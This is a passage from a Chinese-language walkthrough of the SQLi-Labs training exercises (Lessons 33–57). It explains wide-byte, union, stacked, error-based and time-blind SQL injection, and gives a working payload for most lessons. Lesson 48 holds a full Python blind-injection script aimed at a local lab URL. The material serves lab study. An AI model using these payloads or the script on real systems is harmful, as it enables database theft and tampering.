+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$string = <span class="string">'\\\\'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $string .<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>  preg_quote(<span class="string">'\\'</span>).<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\\\\\\"</span> .<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">$string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\"</span>, $string);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $string;</span></span><br></pre></td></tr></table></figure>
+
+<p>escape 转义反斜杠为什么需要 “\\\“ 六个反斜杠？</p>
+<h2 id="Lesson-33"><a href="#Lesson-33" class="headerlink" title="Lesson 33"></a>Lesson 33</h2><p>与上题不同的是过滤变为 addslashes 函数。在手册查看 addslashes 函数。<br><img src="/images/Sqli_Lab_Learning/addslashes.png" alt></p>
+<p>采用和上一题相同的注入方式，<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df'union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-34"><a href="#Lesson-34" class="headerlink" title="Lesson 34"></a>Lesson 34</h2><p>单引号闭合，联合查询注入。<br>同样是宽字节注入，但是 POST 传值和 GET 传值有一些不同。GET 传值会在后台会自动经过一次 URL 解码，但是 POST 不会有这个 URL 解码步骤。所以对于 POST 传值，我们直接使用 %df 对应的字符 �。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=<span class="number">0</span>�' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()%<span class="number">23</span>&amp;passwd=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>宽字节注入真正起作用的是对应的注入字符，不是其字符编码。</strong></p>
+<h2 id="Lesson-35"><a href="#Lesson-35" class="headerlink" title="Lesson 35"></a>Lesson 35</h2><p>普通的联合查询注入，addslashes 对无闭合查询没有影响。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()) ,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-36"><a href="#Lesson-36" class="headerlink" title="Lesson 36"></a>Lesson 36</h2><p>之前提到过的 mysql_real_escape_string() 函数，再看一遍函数原理：<br><img src="/images/Sqli_Lab_Learning/mysql_real_escape_string.png" alt></p>
+<p>单引号被转义，同 addslashes 的情况一样。并且满足存在语句：mysql_query(“SET NAMES gbk”); ，所以使用宽字节注入。<br>GET 方法，单引号闭合。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> %df' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">2</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-37"><a href="#Lesson-37" class="headerlink" title="Lesson 37"></a>Lesson 37</h2><p>POST 方法，单引号闭合。uname 和 passwd 都带有 mysql_real_escape_string（）函数转义。同上面 addslashes 思路基本一样。需要注意的是 POST 方法下，注入字符需要用字符形式表示。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=-1�' union select (select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),1 %23&amp;<span class="attribute">passwd</span>=1</span><br></pre></td></tr></table></figure>
+
+<h1 id="Stacked-Injections"><a href="#Stacked-Injections" class="headerlink" title="Stacked Injections"></a>Stacked Injections</h1><h2 id="Lesson-38-堆叠注入"><a href="#Lesson-38-堆叠注入" class="headerlink" title="Lesson 38 堆叠注入"></a>Lesson 38 堆叠注入</h2><p>可以使用普通的联合查询进行注入，GET 传值，单引号闭合。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">2</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>这题也涉及堆叠注入。使用堆叠注入的前提是存在 mysqli_multi_query( ) 函数（支持多条查询）。但是很多情况下数据库往往调用的是 mysqli_ query( ) 函数（只支持一条查询）。在手册查看一下mysqli_multi_query( ) 函数。</p>
+<p><img src="/images/Sqli_Lab_Learning/mysqli_multi_query.png" alt></p>
+<p>由于可以执行多条 SQL 语句，堆叠注入可以对数据库进行增删改查的操作。打破了联合查询的限制。<br>创建新表 test。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=';<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-39"><a href="#Lesson-39" class="headerlink" title="Lesson 39"></a>Lesson 39</h2><p>普通的联合查询注入。GET 传值，无闭合。<br>payload:</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">''</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database()),<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>同时也存在堆叠注入。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id='';<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-40"><a href="#Lesson-40" class="headerlink" title="Lesson 40"></a>Lesson 40</h2><p>普通的联合查询注入。GET 传值，’) 闭合。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=')  <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>同样的堆叠注入。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=') ;<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-41"><a href="#Lesson-41" class="headerlink" title="Lesson 41"></a>Lesson 41</h2><p>重复的题？<br>与 Lesson 39 一样。<br>payload:</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">''</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database()),<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>堆叠注入。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id='';<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-42"><a href="#Lesson-42" class="headerlink" title="Lesson 42"></a>Lesson 42</h2><p>报错注入，单引号闭合，login_user 有 mysql_real_escape_string( ) 函数过滤，在 login_password 处注入。<br>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_user</span>=1&amp;login_password=' <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),0x7e),1) #&amp;<span class="attribute">mysubmit</span>=Login</span><br></pre></td></tr></table></figure>
+
+<p>奇怪的是这题目 hackerbar POST 不过去？只好在登陆框注入。</p>
+<p>也可以使用堆叠注入。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-43"><a href="#Lesson-43" class="headerlink" title="Lesson 43"></a>Lesson 43</h2><p>login_user 有 mysql_real_escape_string( )函数过滤，以 login_password 为注入点。<br>跟上一题类似，报错注入，改为’)闭合。<br>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_user</span>=1&amp;login_password=') <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),0x7e),1) #&amp;<span class="attribute">mysubmit</span>=Login</span><br></pre></td></tr></table></figure>
+
+<p>堆叠注入。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">');<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-44"><a href="#Lesson-44" class="headerlink" title="Lesson 44"></a>Lesson 44</h2><p>堆叠注入，login_user 有 mysql_real_escape_string( )函数过滤，以 login_password 为注入点。<br>POST 传值，单引号闭合。<br>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_user</span>=admin&amp;login_password=';create table test like<span class="built_in"> users </span>#&amp;<span class="attribute">mysubmit</span>=Login</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注亦可。</p>
+<h2 id="Lesson-45"><a href="#Lesson-45" class="headerlink" title="Lesson 45"></a>Lesson 45</h2><p>跟上一题相同，唯一不同的在于变成了 ‘) 闭合。<br>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_user</span>=admin&amp;login_password=');create table test like<span class="built_in"> users </span>#&amp;<span class="attribute">mysubmit</span>=Login</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注亦可。</p>
+<h2 id="Lesson-46-order-by-注入"><a href="#Lesson-46-order-by-注入" class="headerlink" title="Lesson 46 order by 注入"></a>Lesson 46 order by 注入</h2><p>order by 注入。什么是 order by 注入？</p>
+<p>可控制的位置在order by子句后，如下order参数可控：select * from goods order by $_GET[‘sort’]</p>
+<p>报错注入。<br>尽管如此，由于存在 print_error ，依然可以使用报错注入。GET 传值，单引号屏蔽。<br>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">sort</span>=1 <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>这题亦可以使用盲注。</p>
+<p>这里出现了 mysql_fetch_assoc( ) 函数，顺便查看一下手册。<br><img src="/images/Sqli_Lab_Learning/mysql_fetch_assoc.png" alt></p>
+<h2 id="Lesson-47"><a href="#Lesson-47" class="headerlink" title="Lesson 47"></a>Lesson 47</h2><p>和上一题相同，唯一区别在于这题为单引号闭合。</p>
+<p>报错注入。<br>payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">1</span>' and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注亦可。</p>
+<h2 id="Lesson-48"><a href="#Lesson-48" class="headerlink" title="Lesson 48"></a>Lesson 48</h2><p>order by 注入。<br>由于没有报错提示，仅能进行时间盲注。GET 传值，无闭合。<br>exp：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">import sys</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getPayload(result_index, char_index, ascii):</span><br><span class="line">    <span class="comment"># 系统表中数据</span></span><br><span class="line">    info_database_name = <span class="string">"information_schema"</span></span><br><span class="line">    info_table_name = <span class="string">"tables"</span>  <span class="comment"># schemata / tables / columns</span></span><br><span class="line">    info_column_name = <span class="string">"table_name"</span>  <span class="comment"># schema_name / table_name / column_name</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注入表中数据</span></span><br><span class="line">    database_name = <span class="string">"security"</span></span><br><span class="line">    table_name = <span class="string">"users"</span></span><br><span class="line">    column_name = [<span class="string">"id"</span>, <span class="string">"username"</span>, <span class="string">"password"</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接select</span></span><br><span class="line">    where_str = <span class="string">" where table_schema=database()"</span></span><br><span class="line">    <span class="comment"># where_str = " where table_schema='"+database_name+"'"+" and table_name='"+table_name+"'"</span></span><br><span class="line">    select_str = <span class="string">"select "</span> + info_column_name + <span class="string">" from "</span> + info_database_name + <span class="string">"."</span> + info_table_name + where_str + <span class="string">" limit "</span> + str(</span><br><span class="line">        result_index) + <span class="string">",1"</span></span><br><span class="line">    <span class="comment"># select_str = "select concat_ws('-',"+column_name[0]+","+column_name[1]+","+column_name[2]+") from "+table_name+" limit "+str(result_index)+",1"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接payload</span></span><br><span class="line">    sqli_str = <span class="string">"if(ascii(mid(("</span> + select_str + <span class="string">"),"</span> + str(char_index) + <span class="string">",1))="</span> + str(ascii) + <span class="string">",sleep(0.2),0)"</span></span><br><span class="line">    payload = <span class="string">"?sort=1"</span> + <span class="string">" and "</span> + sqli_str + <span class="string">"%23"</span></span><br><span class="line">    <span class="literal">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def execute(result_index, char_index, ascii):</span><br><span class="line">    <span class="comment"># 连接url</span></span><br><span class="line">    url = <span class="string">"http://localhost:81/SQLI-LABS/sqli-labs-master/Less-48/index.php"</span></span><br><span class="line">    payload = getPayload(result_index, char_index, ascii)</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="comment"># 检查延时</span></span><br><span class="line">    before_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">    url = url + payload</span><br><span class="line">    response = requests.<span class="built_in">get</span>(url)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    after_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">    use_time = after_time - before_time</span><br><span class="line">    <span class="keyword">if</span> use_time &gt; <span class="number">0.1</span>:</span><br><span class="line">        <span class="literal">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="literal">return</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exhaustive(result_index, char_index):</span><br><span class="line">    <span class="comment"># ascii可显字符从32到126共95个 按可能性顺序</span></span><br><span class="line">    ascii_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>,</span><br><span class="line">                  <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'_'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>,</span><br><span class="line">                  <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">' '</span>, <span class="string">'!'</span>, <span class="string">'"'</span>, <span class="string">'#'</span>, <span class="string">'$'</span>, <span class="string">'%'</span>, <span class="string">'&amp;'</span>,</span><br><span class="line">                  <span class="string">'\''</span>, <span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'*'</span>, <span class="string">'+'</span>, <span class="string">','</span>, <span class="string">'-'</span>, <span class="string">'.'</span>, <span class="string">'/'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">':'</span>,</span><br><span class="line">                  <span class="string">';'</span>, <span class="string">'&lt;'</span>, <span class="string">'='</span>, <span class="string">'&gt;'</span>, <span class="string">'?'</span>, <span class="string">'@'</span>, <span class="string">'['</span>, <span class="string">'\\'</span>, <span class="string">']'</span>, <span class="string">'^'</span>, <span class="string">'`'</span>, <span class="string">'&#123;'</span>, <span class="string">'|'</span>, <span class="string">'&#125;'</span>, <span class="string">'~'</span>]</span><br><span class="line">    <span class="keyword">for</span> ascii_char <span class="keyword">in</span> ascii_list:</span><br><span class="line">        ascii = ord(ascii_char)</span><br><span class="line">        <span class="keyword">if</span> execute(str(result_index), str(char_index + <span class="number">1</span>), str(ascii)):</span><br><span class="line">            <span class="literal">return</span> ascii_char</span><br><span class="line">    <span class="literal">return</span> chr(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">num</span> <span class="keyword">in</span> range(<span class="number">32</span>):  <span class="comment"># 查询结果的数量</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> range(<span class="number">32</span>):  <span class="comment"># 单条查询结果的长度</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">char</span> = exhaustive(<span class="built_in">num</span>, <span class="built_in">len</span>)</span><br><span class="line">            <span class="keyword">if</span> ord(<span class="keyword">char</span>) == <span class="number">1</span>:  <span class="comment"># 单条查询结果已被遍历</span></span><br><span class="line">                break</span><br><span class="line">            sys.<span class="keyword">stdout</span>.<span class="built_in">write</span>(<span class="keyword">char</span>)</span><br><span class="line">            sys.<span class="keyword">stdout</span>.flush()</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">1</span>:  <span class="comment"># 查询结果已被遍历</span></span><br><span class="line">            break</span><br><span class="line">        sys.<span class="keyword">stdout</span>.<span class="built_in">write</span>(<span class="string">"\r\n"</span>)</span><br><span class="line">        sys.<span class="keyword">stdout</span>.flush()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-49"><a href="#Lesson-49" class="headerlink" title="Lesson 49"></a>Lesson 49</h2><p>与上一题相同，唯一的区别是变成了单引号闭合。<br>时间盲注，exp 就不放上来了。</p>
+<h2 id="Lesson-50"><a href="#Lesson-50" class="headerlink" title="Lesson 50"></a>Lesson 50</h2><p>存在 mysqli_multi_query( ) 函数，所以存在堆叠注入。</p>
+<p>堆叠注入<br>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">sort</span>=1;create table test like<span class="built_in"> users </span>%23</span><br></pre></td></tr></table></figure>
+
+<p>亦可以使用报错注入。GET 传值，无闭合。<br>payload：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">sort</span>=1 <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>盲注亦可。</p>
+<h2 id="Lesson-51"><a href="#Lesson-51" class="headerlink" title="Lesson 51"></a>Lesson 51</h2><p>跟上一题相同，唯一区别在于这题为单引号闭合。</p>
+<p>报错注入。<br>payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">1</span> 'and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-52"><a href="#Lesson-52" class="headerlink" title="Lesson 52"></a>Lesson 52</h2><p>无报错。存在堆叠注入和时间盲注。</p>
+<p>堆叠注入，GET 传值，无闭合。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注，exp 同 Lesson 48。</p>
+<h2 id="Lesson-53"><a href="#Lesson-53" class="headerlink" title="Lesson 53"></a>Lesson 53</h2><p>跟上一题相同，存在堆叠注入和时间盲注，唯一区别在于这题为单引号闭合。<br>堆叠注入，GET 传值，单引号闭合。<br>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">sort</span>=1';create table test like<span class="built_in"> users </span>%23</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注，exp 同 Lessson 49。</p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><h2 id="Lesson-54"><a href="#Lesson-54" class="headerlink" title="Lesson 54"></a>Lesson 54</h2><p>题目有英文提示：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The objective <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> dump <span class="keyword">the</span> (secret key) <span class="keyword">from</span> only random table <span class="keyword">from</span> Database ('CHALLENGES') <span class="keyword">in</span> Less than <span class="number">10</span> attempts</span><br><span class="line">For fun, <span class="keyword">with</span> <span class="keyword">every</span> reset, <span class="keyword">the</span> challenge spawns random table <span class="built_in">name</span>, column <span class="built_in">name</span>, table data. Keeping <span class="keyword">it</span> fresh <span class="keyword">at</span> all <span class="keyword">times</span>.</span><br></pre></td></tr></table></figure>
+
+<p>大概的意思是，注入的次数如果大于10次，那么数据库端会将表名和字段名以及 secret_key 重置。因此盲注是行不通的了。</p>
+<p>使用普通的联合注入，GET 传值，单引号闭合。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-55"><a href="#Lesson-55" class="headerlink" title="Lesson 55"></a>Lesson 55</h2><p>跟上一题基本相同，不同的地方在于注入的次数不大于14次，并且变成了 ) 闭合。<br>普通的联合注入，GET 传值，单括号闭合。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>) <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-56"><a href="#Lesson-56" class="headerlink" title="Lesson 56"></a>Lesson 56</h2><p>跟上题相同，不同的地方在于变成了 ‘) 闭合。<br>普通的联合注入，GET 传值。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>') <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-57"><a href="#Lesson-57" class="headerlink" title="Lesson 57"></a>Lesson 57</h2><p>跟上题相同，不同的地方在于变成了双引号闭合。<br>普通的联合注入，GET 传值。<br>payload:</p>
